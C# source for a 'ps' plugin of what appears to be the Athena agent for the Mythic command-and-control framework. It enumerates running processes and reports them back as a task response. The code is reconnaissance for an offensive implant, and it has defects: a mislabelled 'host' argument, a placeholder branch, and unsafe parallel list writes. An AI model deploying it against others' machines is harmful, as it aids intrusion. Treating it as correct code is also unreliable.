using Athena.Models;
using Athena.Commands.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading.Tasks;
using Athena.Commands;

namespace Plugins
{
    public class Ps : AthenaPlugin
    {
        public override string Name => "ps";
        public override void Execute(Dictionary<string, string> args)
        {
            try
            {
                List<MythicProcessInfo> processes = new List<MythicProcessInfo>();
                //This can support remote computers, I just need to see if mythic supports it
                Process[] procs;

                if (args.ContainsKey("host"))
                {
                    procs = Process.GetProcessesByName(args["host"].ToString());
                }
                else if (args.ContainsKey("targetlist"))
                {
                    //do multiple remote process by target list like we do with get-sessions
                    procs = Process.GetProcesses(); //Temporary placeholder to  hide compile errors
                }
                else
                {
                    procs = Process.GetProcesses();
                }

                Parallel.ForEach(procs, proc =>
                {
                    try
                    {
                        processes.Add(new MythicProcessInfo()
                        {
                            process_id = proc.Id,
                            name = proc.ProcessName,
                            description = proc.MainWindowTitle,
                            bin_path = proc.MainModule.FileName,
                            start_time = new DateTimeOffset(proc.StartTime).ToUnixTimeMilliseconds(),
                        });
                    }
                    catch
                    {
                        processes.Add(new MythicProcessInfo()
                        {
                            process_id = proc.Id,
                            name = proc.ProcessName,
                            description = proc.MainWindowTitle,
                        });
                    }
                });

                TaskResponseHandler.AddResponse(new ProcessResponseResult
                {
                    task_id = args["task-id"],
                    completed = true,
                    user_output = "0x2C",
                    processes = processes
                });
            }
            catch (Exception e)
            {
                TaskResponseHandler.AddResponse(new ProcessResponseResult
                {
                    task_id = args["task-id"],
                    completed = true,
                    user_output = e.ToString(),
                    processes = new List<MythicProcessInfo>()
                });
            }
        }
    }
}
